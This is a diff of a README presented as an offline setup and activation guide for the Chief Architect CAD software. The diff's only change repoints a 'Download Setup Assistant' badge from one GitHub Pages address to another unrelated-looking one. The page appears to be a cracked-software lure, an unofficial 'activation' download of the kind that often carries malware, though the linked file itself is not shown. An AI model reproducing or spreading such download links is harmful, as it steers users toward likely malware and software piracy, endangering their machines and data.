@@ -1,6 +1,6 @@
 # Chief Architect — Offline Setup & Activation Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://chief-architect-pro.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://matookfj.github.io/.github/chief)
 
 ## 🛠 How to Use
 
